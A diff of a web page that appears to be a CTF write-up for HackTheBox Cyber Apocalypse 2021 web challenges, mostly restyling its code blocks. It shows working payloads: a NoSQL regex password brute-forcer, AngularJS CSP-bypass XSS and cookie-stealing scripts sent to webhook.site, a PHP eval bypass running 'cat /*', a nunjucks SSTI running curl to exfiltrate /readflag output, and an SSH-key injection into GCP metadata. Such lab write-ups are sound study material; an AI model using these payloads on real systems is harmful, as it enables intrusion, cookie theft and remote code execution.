@@ -4,6 +4,7 @@
 		<meta charset="utf-8" />
 		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
 		<link rel="stylesheet" href="/assets/css/main.css" />
+		<link rel="stylesheet" href="/assets/css/main.css" />
 		<noscript><link rel="stylesheet" href="/assets/css/noscript.css" /></noscript>
 	</head>
 	<body class="is-preload">
@@ -43,7 +44,7 @@
 		    </section>
 
       <section id="wrapper">
-<section class="wrapper style5 ">
+<section class="wrapper style2 ">
 <div class="inner">
 <div class="content">
 <h1 class="major">
@@ -65,7 +66,7 @@
 </div>
 </div>
 </section>
-<section class="wrapper style6 alt">
+<section class="wrapper style4 alt">
 <div class="inner">
 <div class="content">
 
@@ -115,20 +116,22 @@
  </code>
  using the URL given by the user.
 </p>
-<pre class="codehilite"><code class="language-php">class CommandModel
-{
-    public function __construct($url)
-    {
-        $this-&gt;command = "curl -sL " . escapeshellcmd($url);
-    }
+<div class="codehilite">
+ <pre><span></span><code><span class="x">class CommandModel</span>
+<span class="x">{</span>
+<span class="x">    public function __construct($url)</span>
+<span class="x">    {</span>
+<span class="x">        $this-&gt;command = "curl -sL " . escapeshellcmd($url);</span>
+<span class="x">    }</span>
 
-    public function exec()
-    {
-        exec($this-&gt;command, $output);
-        return $output;
-    }
-}
+<span class="x">    public function exec()</span>
+<span class="x">    {</span>
+<span class="x">        exec($this-&gt;command, $output);</span>
+<span class="x">        return $output;</span>
+<span class="x">    }</span>
+<span class="x">}</span>
 </code></pre>
+</div>
 <p>
  The
  <code>
@@ -161,7 +164,7 @@
 </div>
 </div>
 </section>
-<section class="wrapper style3 ">
+<section class="wrapper style6 ">
 <div class="inner">
 <div class="content">
 
@@ -249,41 +252,43 @@
 <p>
  The exploit code that I wrote is down below. It can be a little slow, but gave me plenty of time to brew another coffee for the next challenges.
 </p>
-<pre class="codehilite"><code class="language-python">import http.client,string,json,urllib.parse
+<div class="codehilite">
+ <pre><span></span><code><span class="kn">import</span> <span class="nn">http.client</span><span class="o">,</span><span class="nn">string</span><span class="o">,</span><span class="nn">json</span><span class="o">,</span><span class="nn">urllib.parse</span>
 
-username = "admin"
-password = "CHTB{"
+<span class="n">username</span> <span class="o">=</span> <span class="s2">"admin"</span>
+<span class="n">password</span> <span class="o">=</span> <span class="s2">"CHTB{"</span>
 
-rhost_ip = '46.101.22.121'
-rhost_port = 30748
-exe = True
-while exe:
-    for char in string.printable:
-        if char in ['*', '+', '.', '?', '|', '&amp;']:
-            continue
-        c = "C"
-        headers = {
-                "Content-Type": "application/x-www-form-urlencoded"
-        }
-        body = 'username='+username+'&amp;password[$regex]=^'+password+char
-        c = http.client.HTTPConnection(rhost_ip, rhost_port)
-        c.request('POST', '/api/login', body, headers)
-        r = c.getresponse().read()
+<span class="n">rhost_ip</span> <span class="o">=</span> <span class="s1">'46.101.22.121'</span>
+<span class="n">rhost_port</span> <span class="o">=</span> <span class="mi">30748</span>
+<span class="n">exe</span> <span class="o">=</span> <span class="kc">True</span>
+<span class="k">while</span> <span class="n">exe</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">char</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">'*'</span><span class="p">,</span> <span class="s1">'+'</span><span class="p">,</span> <span class="s1">'.'</span><span class="p">,</span> <span class="s1">'?'</span><span class="p">,</span> <span class="s1">'|'</span><span class="p">,</span> <span class="s1">'&amp;'</span><span class="p">]:</span>
+            <span class="k">continue</span>
+        <span class="n">c</span> <span class="o">=</span> <span class="s2">"C"</span>
+        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+                <span class="s2">"Content-Type"</span><span class="p">:</span> <span class="s2">"application/x-www-form-urlencoded"</span>
+        <span class="p">}</span>
+        <span class="n">body</span> <span class="o">=</span> <span class="s1">'username='</span><span class="o">+</span><span class="n">username</span><span class="o">+</span><span class="s1">'&amp;password[$regex]=^'</span><span class="o">+</span><span class="n">password</span><span class="o">+</span><span class="n">char</span>
+        <span class="n">c</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">HTTPConnection</span><span class="p">(</span><span class="n">rhost_ip</span><span class="p">,</span> <span class="n">rhost_port</span><span class="p">)</span>
+        <span class="n">c</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s1">'POST'</span><span class="p">,</span> <span class="s1">'/api/login'</span><span class="p">,</span> <span class="n">body</span><span class="p">,</span> <span class="n">headers</span><span class="p">)</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">getresponse</span><span class="p">()</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
 
-        r_json = json.loads(r)
+        <span class="n">r_json</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
 
-        if r_json["message"] == "Login Successful, welcome back admin.":
-            print(char)
-            password = password + char
-            print(password)
-            if c == '}':
-                exe = False
-            break
+        <span class="k">if</span> <span class="n">r_json</span><span class="p">[</span><span class="s2">"message"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"Login Successful, welcome back admin."</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">char</span><span class="p">)</span>
+            <span class="n">password</span> <span class="o">=</span> <span class="n">password</span> <span class="o">+</span> <span class="n">char</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s1">'}'</span><span class="p">:</span>
+                <span class="n">exe</span> <span class="o">=</span> <span class="kc">False</span>
+            <span class="k">break</span>
 </code></pre>
 </div>
 </div>
+</div>
 </section>
-<section class="wrapper style2 alt">
+<section class="wrapper style1 alt">
 <div class="inner">
 <div class="content">
 
@@ -426,7 +431,7 @@ while exe:
 </div>
 </div>
 </section>
-<section class="wrapper style4 ">
+<section class="wrapper style3 ">
 <div class="inner">
 <div class="content">
 
@@ -503,8 +508,10 @@ while exe:
 <p>
  CSP
 </p>
-<pre class="codehilite"><code>Content-Security-Policy: default-src 'self';script-src 'self' 'unsafe-eval' https://cdnjs.cloudflare.com/;style-src 'self' 'unsafe-inline' https://unpkg.com/nes.css/ https://fonts.googleapis.com/;font-src 'self' https://fonts.gstatic.com/;img-src 'self' data:;child-src 'none';object-src 'none'
+<div class="codehilite">
+ <pre><span></span><code><span class="nt">Content-Security-Policy</span><span class="o">:</span><span class="w"> </span><span class="nt">default-src</span><span class="w"> </span><span class="s1">'self'</span><span class="o">;</span><span class="nt">script-src</span><span class="w"> </span><span class="s1">'self'</span><span class="w"> </span><span class="s1">'unsafe-eval'</span><span class="w"> </span><span class="nt">https</span><span class="o">://</span><span class="nt">cdnjs</span><span class="p">.</span><span class="nc">cloudflare</span><span class="p">.</span><span class="nc">com</span><span class="o">/;</span><span class="nt">style-src</span><span class="w"> </span><span class="s1">'self'</span><span class="w"> </span><span class="s1">'unsafe-inline'</span><span class="w"> </span><span class="nt">https</span><span class="o">://</span><span class="nt">unpkg</span><span class="p">.</span><span class="nc">com</span><span class="o">/</span><span class="nt">nes</span><span class="p">.</span><span class="nc">css</span><span class="o">/</span><span class="w"> </span><span class="nt">https</span><span class="o">://</span><span class="nt">fonts</span><span class="p">.</span><span class="nc">googleapis</span><span class="p">.</span><span class="nc">com</span><span class="o">/;</span><span class="nt">font-src</span><span class="w"> </span><span class="s1">'self'</span><span class="w"> </span><span class="nt">https</span><span class="o">://</span><span class="nt">fonts</span><span class="p">.</span><span class="nc">gstatic</span><span class="p">.</span><span class="nc">com</span><span class="o">/;</span><span class="nt">img-src</span><span class="w"> </span><span class="s1">'self'</span><span class="w"> </span><span class="nt">data</span><span class="o">:;</span><span class="nt">child-src</span><span class="w"> </span><span class="s1">'none'</span><span class="o">;</span><span class="nt">object-src</span><span class="w"> </span><span class="s1">'none'</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  However, this CSP had specified
  <code>
@@ -531,9 +538,11 @@ while exe:
 <p>
  It took some time working on the payload, and I got myself stuck where I could see testing locally that the following code would work except for the final GET request where I would get the flag. I blame it on the fact I didn't have sufficient coffee in my system at this time of night.
 </p>
-<pre class="codehilite"><code>&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"&gt;&lt;/script&gt;
-&lt;div ng-app&gt; {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };fetch("http://127.0.0.1:1337/alien").then(response =&gt; response.text()).then(function(data) {var re = new RegExp("CHTB{(.*?)}");var flag=data.match(re)[1];fetch("https://webhook.site/a19fa9c5-13b1-4131-a33a-ffa664c64a14?p="+flag)});//');}} &lt;/div&gt;
+<div class="codehilite">
+ <pre><span></span><code><span class="nt">&lt;script</span> <span class="na">src=</span><span class="s">"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;div</span> <span class="err">ng-app</span><span class="nt">&gt;</span> <span class="cp">{{</span><span class="s1">'a'</span><span class="nv">.constructor.prototype.charAt</span><span class="o">=[]</span><span class="nv">.join</span><span class="err">;$</span><span class="nv">eval</span><span class="o">(</span><span class="s1">'x=1} } };fetch("http://127.0.0.1:1337/alien").then(response =&gt; response.text()).then(function(data) {var re = new RegExp("CHTB{(.*?)}");var flag=data.match(re)[1];fetch("https://webhook.site/a19fa9c5-13b1-4131-a33a-ffa664c64a14?p="+flag)});//'</span><span class="o">)</span><span class="err">;</span><span class="cp">}}</span> <span class="nt">&lt;/div&gt;</span>
 </code></pre>
+</div>
 <p>
  Fortunately, one of my team members stepped in and realised that I was being a bit of a "dumb dumb" and the CSP would be blocking the final request. However, we could use
  <code>
@@ -541,16 +550,18 @@ while exe:
  </code>
  to get the flag instead. So the working payload was:
 </p>
-<pre class="codehilite"><code>&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"&gt;&lt;/script&gt;
-&lt;div ng-app&gt; {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };fetch("http://127.0.0.1:1337/alien").then(response =&gt; response.text()).then(function(data) {var re = new RegExp("CHTB{(.*?)}");var flag=data.match(re)[1];document.location = "https://webhook.site/a19fa9c5-13b1-4131-a33a-ffa664c64a14?p="+flag;});//');}} &lt;/div&gt;
+<div class="codehilite">
+ <pre><span></span><code><span class="nt">&lt;script</span> <span class="na">src=</span><span class="s">"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;div</span> <span class="err">ng-app</span><span class="nt">&gt;</span> <span class="cp">{{</span><span class="s1">'a'</span><span class="nv">.constructor.prototype.charAt</span><span class="o">=[]</span><span class="nv">.join</span><span class="err">;$</span><span class="nv">eval</span><span class="o">(</span><span class="s1">'x=1} } };fetch("http://127.0.0.1:1337/alien").then(response =&gt; response.text()).then(function(data) {var re = new RegExp("CHTB{(.*?)}");var flag=data.match(re)[1];document.location = "https://webhook.site/a19fa9c5-13b1-4131-a33a-ffa664c64a14?p="+flag;});//'</span><span class="o">)</span><span class="err">;</span><span class="cp">}}</span> <span class="nt">&lt;/div&gt;</span>
 </code></pre>
+</div>
 <p>
  <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/times_flag.png"/>
 </p>
 </div>
 </div>
 </section>
-<section class="wrapper style1 alt">
+<section class="wrapper style5 alt">
 <div class="inner">
 <div class="content">
 
@@ -586,9 +597,11 @@ while exe:
  </code>
  to get the flag. However, there was a regex mapping that I needed to bypass.
 </p>
-<pre class="codehilite"><code>regex_map http://.*/shutdown http://127.0.0.1/403
-regex_map http://.*/ http://127.0.0.1/
+<div class="codehilite">
+ <pre><span></span><code><span class="n">regex_map</span><span class="w"> </span><span class="nl">http:</span><span class="c1">//.*/shutdown http://127.0.0.1/403</span>
+<span class="n">regex_map</span><span class="w"> </span><span class="nl">http:</span><span class="c1">//.*/ http://127.0.0.1/</span>
 </code></pre>
+</div>
 <p>
  The exploit was pretty simple, instead of putting in
  <code>
@@ -614,7 +627,7 @@ regex_map http://.*/ http://127.0.0.1/
 </div>
 </div>
 </section>
-<section class="wrapper style5 ">
+<section class="wrapper style4 ">
 <div class="inner">
 <div class="content">
 
@@ -660,24 +673,26 @@ regex_map http://.*/ http://127.0.0.1/
  </code>
  .
 </p>
-<pre class="codehilite"><code>&lt;?php
-class CalcModel
-{
-    public static function getCalc($formula)
-    {
-        if (strlen($formula) &gt;= 100 || preg_match_all('/[a-z\'"]+/i', $formula)) {
-            return '🤡 dont bite the hand that feeds you human 🤡';
-        }
-        try {
-            eval('$pcalc = ' . $formula . ';');
-            return isset($pcalc) ? $pcalc : '?';
-        }
-        catch (ParseError $err) {
-           return "$err";
-        }
-    }
-}
+<div class="codehilite">
+ <pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="k">class</span> <span class="nc">CalcModel</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">getCalc</span><span class="p">(</span><span class="nv">$formula</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$formula</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">100</span> <span class="o">||</span> <span class="nb">preg_match_all</span><span class="p">(</span><span class="s1">'/[a-z\'"]+/i'</span><span class="p">,</span> <span class="nv">$formula</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="s1">'🤡 dont bite the hand that feeds you human 🤡'</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">try</span> <span class="p">{</span>
+            <span class="k">eval</span><span class="p">(</span><span class="s1">'$pcalc = '</span> <span class="o">.</span> <span class="nv">$formula</span> <span class="o">.</span> <span class="s1">';'</span><span class="p">);</span>
+            <span class="k">return</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$pcalc</span><span class="p">)</span> <span class="o">?</span> <span class="nv">$pcalc</span> <span class="o">:</span> <span class="s1">'?'</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">catch</span> <span class="p">(</span><span class="nx">ParseError</span> <span class="nv">$err</span><span class="p">)</span> <span class="p">{</span>
+           <span class="k">return</span> <span class="s2">"</span><span class="si">$err</span><span class="s2">"</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
 </code></pre>
+</div>
 <p>
  I did a bit of research about bypassing
  <code>
@@ -766,29 +781,31 @@ class CalcModel
  </code>
  .
 </p>
-<pre class="codehilite"><code>def get_payload_component(orig_str):
-    orig_bytes = orig_str.encode();
-    return ''.join([hex(ord(x) ^ 0xff).replace("0x", "%") for x in orig_bytes])
+<div class="codehilite">
+ <pre><span></span><code><span class="n">def</span><span class="w"> </span><span class="n">get_payload_component</span><span class="p">(</span><span class="n">orig_str</span><span class="p">):</span><span class="w"></span>
+<span class="w">    </span><span class="n">orig_bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">orig_str</span><span class="o">.</span><span class="n">encode</span><span class="p">();</span><span class="w"></span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">hex</span><span class="p">(</span><span class="n">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="mh">0xff</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">"0x"</span><span class="p">,</span><span class="w"> </span><span class="s2">"%"</span><span class="p">)</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">orig_bytes</span><span class="p">])</span><span class="w"></span>
 
-orig_payload_1 = "system"
-orig_payload_2 = "cat /*"
+<span class="n">orig_payload_1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"system"</span><span class="w"></span>
+<span class="n">orig_payload_2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"cat /*"</span><span class="w"></span>
 
-payload_1 = get_payload_component(orig_payload_1)
-payload_2 = get_payload_component(orig_payload_2)
+<span class="n">payload_1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_payload_component</span><span class="p">(</span><span class="n">orig_payload_1</span><span class="p">)</span><span class="w"></span>
+<span class="n">payload_2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_payload_component</span><span class="p">(</span><span class="n">orig_payload_2</span><span class="p">)</span><span class="w"></span>
 
-payload = "/?formula=${{(~{payload_1})((~{payload_2}))}}".format(
-        payload_1=payload_1,
-        payload_2=payload_2
-)
-print(payload)
+<span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"/?formula=${{(~{payload_1})((~{payload_2}))}}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="w"></span>
+<span class="w">        </span><span class="n">payload_1</span><span class="o">=</span><span class="n">payload_1</span><span class="p">,</span><span class="w"></span>
+<span class="w">        </span><span class="n">payload_2</span><span class="o">=</span><span class="n">payload_2</span><span class="w"></span>
+<span class="p">)</span><span class="w"></span>
+<span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/pcalc_pwn.png"/>
 </p>
 </div>
 </div>
 </section>
-<section class="wrapper style1 alt">
+<section class="wrapper style5 alt">
 <div class="inner">
 <div class="content">
 
@@ -874,22 +891,26 @@ print(payload)
  </code>
  , but I had to be quick since the bot quickly wipes the database after it reads the feedback. To be as quick as possible I executed a bash script on my machine to try and grab the flag when it appeared. The final payload that got me the flag is below.
 </p>
-<pre class="codehilite"><code>&lt;iframe src="/list?callback=let x = {'complaint':document.cookie};fetch('/api/submit',{method:'post',headers:{'Content-Type':'application/json'},body:JSON.stringify(x)})" /&gt;
+<div class="codehilite">
+ <pre><span></span><code>&lt;iframe src="/list?callback=let x = {'complaint':document.cookie};fetch('/api/submit',{method:'post',headers:{'Content-Type':'application/json'},body:JSON.stringify(x)})" /&gt;
 </code></pre>
+</div>
 <p>
  <strong>
   bash command to get the flag
  </strong>
 </p>
-<pre class="codehilite"><code>while :; do curl -s http://138.68.177.159:30904/api/jsonp | grep CHTB; done
+<div class="codehilite">
+ <pre><span></span><code><span class="nt">while</span><span class="w"> </span><span class="o">:;</span><span class="w"> </span><span class="nt">do</span><span class="w"> </span><span class="nt">curl</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nt">http</span><span class="o">://</span><span class="nt">138</span><span class="p">.</span><span class="nc">68</span><span class="p">.</span><span class="nc">177</span><span class="p">.</span><span class="nc">159</span><span class="p">:</span><span class="nd">30904</span><span class="o">/</span><span class="nt">api</span><span class="o">/</span><span class="nt">jsonp</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nt">grep</span><span class="w"> </span><span class="nt">CHTB</span><span class="o">;</span><span class="w"> </span><span class="nt">done</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/alien_compliant_form.png"/>
 </p>
 </div>
 </div>
 </section>
-<section class="wrapper style6 ">
+<section class="wrapper style3 ">
 <div class="inner">
 <div class="content">
 
@@ -935,13 +956,15 @@ print(payload)
  </code>
  (see code snippet below). This to me screams out that it is vulnerable to Server-Side Template Injection (SSTI). SSTI is when you can execute code within the template engine, which can be leveraged to compromise the system.
 </p>
-<pre class="codehilite"><code>message.html = nunjucks.renderString(`
-                        &lt;p&gt;&lt;b&gt;Hello&lt;/b&gt; &lt;i&gt;${ emailAddress }&lt;/i&gt;&lt;/p&gt;
-                        &lt;p&gt;A cat has been deployed to process your submission 🐈&lt;/p&gt;&lt;br/&gt;
-                        &lt;img width="500" height="350" src="cid:{{ gifSrc }}"/&gt;&lt;/p&gt;
+<div class="codehilite">
+ <pre><span></span><code>message.html = nunjucks.renderString(`
+                        <span class="nt">&lt;p&gt;&lt;b&gt;</span>Hello<span class="nt">&lt;/b&gt;</span> <span class="nt">&lt;i&gt;</span><span class="cp">${</span> <span class="n">emailAddress</span> <span class="cp">}</span><span class="nt">&lt;/i&gt;&lt;/p&gt;</span>
+                        <span class="nt">&lt;p&gt;</span>A cat has been deployed to process your submission 🐈<span class="nt">&lt;/p&gt;&lt;br/&gt;</span>
+                        <span class="nt">&lt;img</span> <span class="na">width=</span><span class="s">"500"</span> <span class="na">height=</span><span class="s">"350"</span> <span class="na">src=</span><span class="s">"cid:{{ gifSrc }}"/</span><span class="nt">&gt;&lt;/p&gt;</span>
                         `, { gifSrc }
                     );
 </code></pre>
+</div>
 <p>
  The only problem is that I did not have experience vulnerabilities with
  <code>
@@ -961,15 +984,17 @@ print(payload)
  </code>
  . My final payload for the email address is as folllows.
 </p>
-<pre class="codehilite"><code>{{range.constructor("global.process.mainModule.require('child_process').execSync('curl -XPOST -d \"$(/readflag)\" https://webhook.site/a19fa9c5-13b1-4131-a33a-ffa664c64a14').stdout")()}}
+<div class="codehilite">
+ <pre><span></span><code><span class="p">{{</span><span class="nb">range</span><span class="o">.</span><span class="n">constructor</span><span class="p">(</span><span class="s2">"global.process.mainModule.require('child_process').execSync('curl -XPOST -d </span><span class="se">\"</span><span class="s2">$(/readflag)</span><span class="se">\"</span><span class="s2"> https://webhook.site/a19fa9c5-13b1-4131-a33a-ffa664c64a14').stdout"</span><span class="p">)()}}</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/join_the_starfleet_today.png"/>
 </p>
 </div>
 </div>
 </section>
-<section class="wrapper style4 alt">
+<section class="wrapper style1 alt">
 <div class="inner">
 <div class="content">
 
@@ -1019,15 +1044,17 @@ print(payload)
   Payload to submit on the report page
  </strong>
 </p>
-<pre class="codehilite"><code>http://127.0.0.1:1337/&lt;script&gt;var x = document.cookie;fetch('https://webhook.site/a19fa9c5-13b1-4131-a33a-ffa664c64a14',{method:'post',body:'test='+x})&lt;/script&gt;
+<div class="codehilite">
+ <pre><span></span><code>http://127.0.0.1:1337/<span class="nt">&lt;script&gt;</span>var x = document.cookie;fetch('https://webhook.site/a19fa9c5-13b1-4131-a33a-ffa664c64a14',{method:'post',body:'test='+x})<span class="nt">&lt;/script&gt;</span>
 </code></pre>
+</div>
 <p>
  <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/bug_report_flag.png"/>
 </p>
 </div>
 </div>
 </section>
-<section class="wrapper style3 ">
+<section class="wrapper style2 ">
 <div class="inner">
 <div class="content">
 
@@ -1170,8 +1197,10 @@ print(payload)
  </a>
  .
 </p>
-<pre class="codehilite"><code>curl -H "Authorization: Bearer &lt;access token&gt;" -H "Content-type: application/json" https://compute.googleapis.com/compute/v1/projects/essential-hawk-310212/zones/us-central1-a/instances/instance-1
+<div class="codehilite">
+ <pre><span></span><code>curl -H "Authorization: Bearer &lt;access token&gt;" -H "Content-type: application/json" https://compute.googleapis.com/compute/v1/projects/essential-hawk-310212/zones/us-central1-a/instances/instance-1
 </code></pre>
+</div>
 <p>
  <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/gcloud_sshkey_metadata.png"/>
 </p>
@@ -1194,16 +1223,18 @@ print(payload)
   payload.json
  </strong>
 </p>
-<pre class="codehilite"><code class="language-json">{
-    "items": [
-        {
-            "key": "ssh-keys",
-            "value": "root:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPHugK49fy5Dzg9O+NTD34kpQ+3+CjaEj5P1MbhiAANZnkts5dt7Mmq0xf+UInKs7HyVhD3FfpwrRszvnqD39mGc4Eou66JVc1Tj9Hmhs0/hR8RDa0EmWvu0pG2ftehu/fiWutm1mGhKlsCW30wuCJkF7/4otSopkBCG2HD4ZaSToplZ4QhFVS+lIa9zItfYAK6zEXuD6R/Eont6VxK6mDiwijzydXFkWzpQcCe8GazEn4QBr0lh0KKosY26ELj6v/0aW1ZxlPD5Dg57RwBl3/Ae9V2D0rjZRKj8If8B9QQvovyt3M9jjnGv+KZGFVVowxmvZ5JN7B65UEQKHZMSKQB6bE2HCiW62wQm3th9KTXZR5hlzTj9prEx3l0IjsOwyVe5Di1NPFwbKcY8fauCjsK4Tb7QkjV46LGdQ2a+JdfjxKCFfpi1ZSNC9aHLBZtpeq/5Any+Wbw14GaiGrjSSXFhKFZMmzGlkJh1hQ8UXWWGOdsU4O+GJRFaS8UT61Cr0= makelarissub@hackthebox.eu"
-        }
-    ],
-    "fingerprint" : "3OBr4seS2Vk="
-}
+<div class="codehilite">
+ <pre><span></span><code><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="nt">"items"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"></span>
+<span class="w">        </span><span class="p">{</span><span class="w"></span>
+<span class="w">            </span><span class="nt">"key"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ssh-keys"</span><span class="p">,</span><span class="w"></span>
+<span class="w">            </span><span class="nt">"value"</span><span class="p">:</span><span class="w"> </span><span class="s2">"root:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPHugK49fy5Dzg9O+NTD34kpQ+3+CjaEj5P1MbhiAANZnkts5dt7Mmq0xf+UInKs7HyVhD3FfpwrRszvnqD39mGc4Eou66JVc1Tj9Hmhs0/hR8RDa0EmWvu0pG2ftehu/fiWutm1mGhKlsCW30wuCJkF7/4otSopkBCG2HD4ZaSToplZ4QhFVS+lIa9zItfYAK6zEXuD6R/Eont6VxK6mDiwijzydXFkWzpQcCe8GazEn4QBr0lh0KKosY26ELj6v/0aW1ZxlPD5Dg57RwBl3/Ae9V2D0rjZRKj8If8B9QQvovyt3M9jjnGv+KZGFVVowxmvZ5JN7B65UEQKHZMSKQB6bE2HCiW62wQm3th9KTXZR5hlzTj9prEx3l0IjsOwyVe5Di1NPFwbKcY8fauCjsK4Tb7QkjV46LGdQ2a+JdfjxKCFfpi1ZSNC9aHLBZtpeq/5Any+Wbw14GaiGrjSSXFhKFZMmzGlkJh1hQ8UXWWGOdsU4O+GJRFaS8UT61Cr0= makelarissub@hackthebox.eu"</span><span class="w"></span>
+<span class="w">        </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="p">],</span><span class="w"></span>
+<span class="w">    </span><span class="nt">"fingerprint"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"3OBr4seS2Vk="</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  The value for
  <code>
@@ -1223,17 +1254,19 @@ print(payload)
  </code>
  that is used to prevent simultaneous changes to metadata that is shown below.
 </p>
-<pre class="codehilite"><code>"metadata": {
-    "fingerprint": "3OBr4seS2Vk=",
-    "items": [
-      {
-        "key": "sshKeys",
-        "value": "root:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD0fVPxASQe90gLUXWjnCjJsLOsUMw/mPTOCdJzM0IeM/EBFOYPeuF2bR2f/8FKkhX5WOGnvoWReCLKHV5xz7kwq63E9JU5I3vfObsEd5R3glyf7wEPOB0+/gaebldTERAlMDcTOlRwbYD+JILUrlqWGIskt/pcPP3TWeu2STErxcdQaJQc+5cZlOzLLPeKNQUel3otqIV4Bwr914uAuy3fe3gpLH2irEyPByQdpanyhiZZXIAdlPcR5E9AEosRHPmSBA9pn+O3/V7pfBND1V04q4AGrXMuLaDw019A7Xc1fSE2j3zWB5/FgEtYoKnI81BHPOQCqtAZ941kzdF4Zs3X/DrVraYEHD13yRtCmogrj0Iot1R4ABkUXEPLyNkqgYQV55vag9caUUwJUxU2AhldHK1NVErVndCTwu6VNBLgaJJy8iiln4EIBB3Ynb5qTsC/xKYLCjF1+2NxDeGMrrF7c5lwIUJzZIF2P+Rn2V2NDpEHOsJXsSpsGPBgxHbGDj0= jusepe@nix\nunknown1:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRnJrXGPgJi3sAmmtOIL1yiorFOQ4U9CIsI0OWds7izDtsPWXvinIQOpqxxWRXwdKc0Ye3vCN1L9imjmQ0ILN0UEQsCmZfxrlYBFsS8VpJbIwkewFSRTMirZ4IFN84twVWRHJiFZ0RGzIDlW8q/XA16iUygiS+ehGl/SyA9DwZwWZfLDRLkvj8O+widR6qlTu9juANWxO8klwsk06qilQ/k2y1dCzAI0LNGybmLHonaqJY35E80xSzZHPFDQIDSM1gYtGkcuiVGCE3VufdVhZHqGSI1L4MlPmjEnRlRGhINsoWl6eI0Ltw+QUdTh+zrQJvPhFg3NDbTILmRdL/m2LpxxQ9vG7pZmB41uRmkm+4UZgLPZiQGSWVaosbYADWXB6DXTBpMW5jatwtUtI3oiM6SdfC4DIdU/tlQ/L30MMhuds/V7om/izbxYGh2oKFgnVYGr5d5c3cMHTNfr8kjdn+TDQnEyRlBxUIOMd5pff4pzfyP4Pxorz03ZoEUruI4J8= unknown1@Macbook-makelaris.local"
-      }
-    ],
-    "kind": "compute#metadata"
-  }
+<div class="codehilite">
+ <pre><span></span><code><span class="ss">"metadata"</span><span class="err">:</span><span class="w"> </span><span class="err">{</span><span class="w"></span>
+<span class="w">    </span><span class="ss">"fingerprint"</span><span class="err">:</span><span class="w"> </span><span class="ss">"3OBr4seS2Vk="</span><span class="p">,</span><span class="w"></span>
